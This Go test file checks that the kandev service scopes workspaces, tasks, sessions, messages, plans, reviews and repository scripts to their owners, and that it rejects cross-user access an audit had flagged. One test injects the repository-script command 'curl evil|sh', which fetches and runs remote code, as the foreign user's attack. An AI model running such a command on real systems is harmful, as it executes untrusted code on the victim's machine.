package service

import (
	"context"
	"errors"
	"testing"

	"go.uber.org/zap"

	"github.com/kandev/kandev/internal/auth/authn"
	commonlogger "github.com/kandev/kandev/internal/common/logger"
	"github.com/kandev/kandev/internal/task/models"
	"github.com/kandev/kandev/internal/task/repository/repoerrors"
	v1 "github.com/kandev/kandev/pkg/api/v1"
)

func accessTestLogger(t *testing.T) *commonlogger.Logger {
	t.Helper()
	log, err := commonlogger.NewFromZap(zap.NewNop())
	if err != nil {
		t.Fatalf("logger: %v", err)
	}
	return log
}

// Per-user workspace scoping matrix: user A must not see or mutate user B's
// workspaces/tasks; internal (identity-less) and synthetic (auth disabled)
// callers keep today's see-everything behavior; pre-auth unowned rows stay
// visible to everyone.

func ctxAs(userID string) context.Context {
	return authn.WithIdentity(context.Background(), authn.Identity{UserID: userID, Role: authn.RoleMember})
}

func ctxSynthetic() context.Context {
	return authn.WithIdentity(context.Background(), authn.Identity{UserID: "default-user", Role: authn.RoleAdmin, Synthetic: true})
}

func seedScopedWorkspaces(t *testing.T, repo interface {
	CreateWorkspace(context.Context, *models.Workspace) error
	CreateWorkflow(context.Context, *models.Workflow) error
	CreateTask(context.Context, *models.Task) error
	CreateTaskSession(context.Context, *models.TaskSession) error
}) {
	t.Helper()
	ctx := context.Background()
	workspaces := []*models.Workspace{
		{ID: "ws-a", Name: "A's", OwnerID: "user-a"},
		{ID: "ws-b", Name: "B's", OwnerID: "user-b"},
		{ID: "ws-legacy", Name: "Pre-auth"},
	}
	for _, ws := range workspaces {
		if err := repo.CreateWorkspace(ctx, ws); err != nil {
			t.Fatalf("create workspace %s: %v", ws.ID, err)
		}
	}
	if err := repo.CreateWorkflow(ctx, &models.Workflow{ID: "wf-b", WorkspaceID: "ws-b", Name: "B flow"}); err != nil {
		t.Fatalf("create workflow: %v", err)
	}
	if err := repo.CreateTask(ctx, &models.Task{
		ID: "task-b", WorkspaceID: "ws-b", WorkflowID: "wf-b", WorkflowStepID: "step-1",
		Title: "B's task", State: v1.TaskStateCreated, Priority: "medium",
	}); err != nil {
		t.Fatalf("create task: %v", err)
	}
	if err := repo.CreateTaskSession(ctx, &models.TaskSession{
		ID: "sess-b", TaskID: "task-b", State: models.TaskSessionStateCreated,
	}); err != nil {
		t.Fatalf("create session: %v", err)
	}
}

func TestWorkspaceScopingListAndGet(t *testing.T) {
	svc, _, repo := createTestService(t)
	seedScopedWorkspaces(t, repo)

	// User A sees own + legacy unowned, not B's.
	listed, err := svc.ListWorkspaces(ctxAs("user-a"))
	if err != nil {
		t.Fatal(err)
	}
	ids := map[string]bool{}
	for _, ws := range listed {
		ids[ws.ID] = true
	}
	if !ids["ws-a"] || !ids["ws-legacy"] || ids["ws-b"] {
		t.Fatalf("user-a sees %v; want ws-a + ws-legacy only", ids)
	}

	// Foreign workspace reads as not-found (no existence leak).
	if _, err := svc.GetWorkspace(ctxAs("user-a"), "ws-b"); !errors.Is(err, repoerrors.ErrWorkspaceNotFound) {
		t.Fatalf("get foreign workspace: %v", err)
	}
	if _, err := svc.GetWorkspace(ctxAs("user-a"), "ws-legacy"); err != nil {
		t.Fatalf("legacy workspace must stay visible: %v", err)
	}

	// Internal and synthetic callers see everything (including ws-b; the
	// fixture may seed extra default workspaces, so assert containment).
	for name, ctx := range map[string]context.Context{"internal": context.Background(), "synthetic": ctxSynthetic()} {
		all, err := svc.ListWorkspaces(ctx)
		if err != nil {
			t.Fatalf("%s caller: %v", name, err)
		}
		seen := map[string]bool{}
		for _, ws := range all {
			seen[ws.ID] = true
		}
		if !seen["ws-a"] || !seen["ws-b"] || !seen["ws-legacy"] {
			t.Fatalf("%s caller sees %v; want all seeded workspaces", name, seen)
		}
	}
}

func TestWorkspaceScopingMutations(t *testing.T) {
	svc, _, repo := createTestService(t)
	seedScopedWorkspaces(t, repo)

	name := "hijacked"
	if _, err := svc.UpdateWorkspace(ctxAs("user-a"), "ws-b", &UpdateWorkspaceRequest{Name: &name}); !errors.Is(err, repoerrors.ErrWorkspaceNotFound) {
		t.Fatalf("update foreign workspace: %v", err)
	}
	if err := svc.DeleteWorkspace(ctxAs("user-a"), "ws-b"); !errors.Is(err, repoerrors.ErrWorkspaceNotFound) {
		t.Fatalf("delete foreign workspace: %v", err)
	}
	// Owner still can.
	if _, err := svc.UpdateWorkspace(ctxAs("user-b"), "ws-b", &UpdateWorkspaceRequest{Name: &name}); err != nil {
		t.Fatalf("owner update: %v", err)
	}
}

func TestWorkspaceScopingTasksAndWorkflows(t *testing.T) {
	svc, _, repo := createTestService(t)
	seedScopedWorkspaces(t, repo)

	if _, err := svc.GetTask(ctxAs("user-a"), "task-b"); !errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("get foreign task: %v", err)
	}
	if _, err := svc.GetTask(ctxAs("user-b"), "task-b"); err != nil {
		t.Fatalf("owner get task: %v", err)
	}
	if _, err := svc.ListTasks(ctxAs("user-a"), "wf-b"); !errors.Is(err, repoerrors.ErrWorkspaceNotFound) {
		t.Fatalf("list foreign workflow tasks: %v", err)
	}
	if _, _, err := svc.ListTasksByWorkspace(ctxAs("user-a"), "ws-b", "", "", "", 1, 10, "", false, false, false, false); !errors.Is(err, repoerrors.ErrWorkspaceNotFound) {
		t.Fatalf("list foreign workspace tasks: %v", err)
	}
	if _, err := svc.ListWorkflows(ctxAs("user-a"), "ws-b", false); !errors.Is(err, repoerrors.ErrWorkspaceNotFound) {
		t.Fatalf("list foreign workflows: %v", err)
	}
	if _, err := svc.GetWorkflow(ctxAs("user-a"), "wf-b"); !errors.Is(err, repoerrors.ErrWorkspaceNotFound) {
		t.Fatalf("get foreign workflow: %v", err)
	}
	if err := svc.ArchiveTask(ctxAs("user-a"), "task-b"); !errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("archive foreign task: %v", err)
	}
	if err := svc.DeleteTask(ctxAs("user-a"), "task-b"); !errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("delete foreign task: %v", err)
	}
}

func TestCreateWorkspaceStampsOwner(t *testing.T) {
	svc, _, _ := createTestService(t)

	created, err := svc.CreateWorkspace(ctxAs("user-a"), &CreateWorkspaceRequest{Name: "mine", OwnerID: "spoofed"})
	if err != nil {
		t.Fatal(err)
	}
	if created.OwnerID != "user-a" {
		t.Fatalf("owner = %q, want user-a (request-body owner must be ignored)", created.OwnerID)
	}
	// Synthetic caller keeps pre-auth semantics (request passthrough).
	created, err = svc.CreateWorkspace(ctxSynthetic(), &CreateWorkspaceRequest{Name: "legacy"})
	if err != nil {
		t.Fatal(err)
	}
	if created.OwnerID != "" {
		t.Fatalf("synthetic-created owner = %q, want empty", created.OwnerID)
	}
}

func TestAuthorizeSessionAccess(t *testing.T) {
	svc, _, repo := createTestService(t)
	seedScopedWorkspaces(t, repo)

	if err := svc.AuthorizeSessionAccess(ctxAs("user-a"), "sess-b"); !errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("foreign session access: %v", err)
	}
	if err := svc.AuthorizeSessionAccess(ctxAs("user-b"), "sess-b"); err != nil {
		t.Fatalf("owner session access: %v", err)
	}
	if err := svc.AuthorizeSessionAccess(context.Background(), "sess-b"); err != nil {
		t.Fatalf("internal session access: %v", err)
	}
}

func TestAuthorizeTaskSessionAccessRejectsMismatchedPair(t *testing.T) {
	svc, _, repo := createTestService(t)
	seedScopedWorkspaces(t, repo)
	if err := repo.CreateTask(context.Background(), &models.Task{
		ID: "task-b-other", WorkspaceID: "ws-b", WorkflowID: "wf-b", WorkflowStepID: "step-1",
		Title: "B's other task", State: v1.TaskStateCreated, Priority: "medium",
	}); err != nil {
		t.Fatalf("create other task: %v", err)
	}

	for name, ctx := range map[string]context.Context{
		"owner":    ctxAs("user-b"),
		"internal": context.Background(),
	} {
		err := svc.AuthorizeTaskSessionAccess(ctx, "task-b-other", "sess-b")
		if !errors.Is(err, repoerrors.ErrTaskNotFound) {
			t.Fatalf("%s mismatched pair error = %v, want ErrTaskNotFound", name, err)
		}
	}

	if err := svc.AuthorizeTaskSessionAccess(ctxAs("user-b"), "task-b", "sess-b"); err != nil {
		t.Fatalf("matching pair: %v", err)
	}
}

// TestMessageScopingBlocksForeignSession covers the read/search paths the
// security audit flagged as unscoped (agent-conversation cross-user read).
func TestMessageScopingBlocksForeignSession(t *testing.T) {
	svc, _, repo := createTestService(t)
	seedScopedWorkspaces(t, repo)

	if _, err := svc.ListMessages(ctxAs("user-a"), "sess-b"); !errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("foreign ListMessages: %v", err)
	}
	if _, _, err := svc.ListMessagesPaginated(ctxAs("user-a"), ListMessagesRequest{TaskSessionID: "sess-b"}); !errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("foreign ListMessagesPaginated: %v", err)
	}
	if _, err := svc.SearchMessages(ctxAs("user-a"), "sess-b", "q", 10); !errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("foreign SearchMessages: %v", err)
	}
	// Owner and internal callers are unaffected.
	if _, err := svc.ListMessages(ctxAs("user-b"), "sess-b"); err != nil {
		t.Fatalf("owner ListMessages: %v", err)
	}
	if _, err := svc.ListMessages(context.Background(), "sess-b"); err != nil {
		t.Fatalf("internal ListMessages: %v", err)
	}
}

// TestPlanAndWalkthroughScoping covers the plan/walkthrough/review services,
// which each carry their own task authorizer seam (wired to the task service).
// Exercises the assembled path AuthorizeTaskAccess → SetTaskAuthorizer →
// service, so all three stay uniformly covered: a foreign owner is denied with
// ErrTaskNotFound and the real owner passes the gate.
func TestPlanAndWalkthroughScoping(t *testing.T) {
	svc, _, repo := createTestService(t)
	seedScopedWorkspaces(t, repo)

	log := accessTestLogger(t)
	plan := NewPlanService(repo, nil, log)
	plan.SetTaskAuthorizer(svc.AuthorizeTaskAccess)
	if _, err := plan.GetPlan(ctxAs("user-a"), "task-b"); !errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("foreign plan get: %v", err)
	}
	if err := plan.DeletePlan(ctxAs("user-a"), "task-b"); !errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("foreign plan delete: %v", err)
	}
	// Owner and internal callers pass the gate (missing plan is nil/NotFound,
	// not an auth error).
	if _, err := plan.GetPlan(ctxAs("user-b"), "task-b"); errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("owner plan get must pass the auth gate: %v", err)
	}

	wt := NewWalkthroughService(repo, nil, log)
	wt.SetTaskAuthorizer(svc.AuthorizeTaskAccess)
	if _, err := wt.GetWalkthrough(ctxAs("user-a"), "task-b"); !errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("foreign walkthrough get: %v", err)
	}
	if err := wt.DeleteWalkthrough(ctxAs("user-a"), "task-b"); !errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("foreign walkthrough delete: %v", err)
	}

	review := NewReviewService(repo, nil, log)
	review.SetTaskAuthorizer(svc.AuthorizeTaskAccess)
	if _, _, err := review.PublishFindings(ctxAs("user-a"), PublishFindingsRequest{
		TaskID:   "task-b",
		Findings: []ReviewFindingInput{validFindingInput()},
	}); !errors.Is(err, repoerrors.ErrTaskNotFound) {
		t.Fatalf("foreign review publish: %v", err)
	}
	// Owner passes the gate and the finding is actually persisted.
	if _, findings, err := review.PublishFindings(ctxAs("user-b"), PublishFindingsRequest{
		TaskID:   "task-b",
		Findings: []ReviewFindingInput{validFindingInput()},
	}); err != nil {
		t.Fatalf("owner review publish must pass the auth gate: %v", err)
	} else if len(findings) != 1 {
		t.Fatalf("owner review publish should return the stored finding, got %d", len(findings))
	}
	// Confirm the write landed in the repository, not just the returned slice.
	persisted, err := repo.ListTaskReviewFindings(context.Background(), "task-b")
	if err != nil {
		t.Fatalf("list persisted review findings: %v", err)
	}
	if len(persisted) != 1 {
		t.Fatalf("owner review publish should persist exactly one finding, got %d", len(persisted))
	}
}

// TestRepositoryScriptScoping covers the repository-script read/inject paths
// the security audit flagged as unscoped.
func TestRepositoryScriptScoping(t *testing.T) {
	svc, _, repo := createTestService(t)
	seedScopedWorkspaces(t, repo)
	ctx := context.Background()
	if err := repo.CreateRepository(ctx, &models.Repository{ID: "repo-b", WorkspaceID: "ws-b", Name: "b"}); err != nil {
		t.Fatalf("seed repo: %v", err)
	}

	if _, err := svc.CreateRepositoryScript(ctxAs("user-a"), &CreateRepositoryScriptRequest{
		RepositoryID: "repo-b", Name: "evil", Command: "curl evil|sh",
	}); !errors.Is(err, repoerrors.ErrRepositoryNotFound) {
		t.Fatalf("foreign CreateRepositoryScript: %v", err)
	}
	if _, err := svc.ListRepositoryScripts(ctxAs("user-a"), "repo-b"); !errors.Is(err, repoerrors.ErrRepositoryNotFound) {
		t.Fatalf("foreign ListRepositoryScripts: %v", err)
	}
	// Owner can create + list.
	created, err := svc.CreateRepositoryScript(ctxAs("user-b"), &CreateRepositoryScriptRequest{
		RepositoryID: "repo-b", Name: "setup", Command: "make",
	})
	if err != nil {
		t.Fatalf("owner CreateRepositoryScript: %v", err)
	}
	if _, err := svc.GetRepositoryScript(ctxAs("user-a"), created.ID); !errors.Is(err, repoerrors.ErrRepositoryNotFound) {
		t.Fatalf("foreign GetRepositoryScript: %v", err)
	}
}
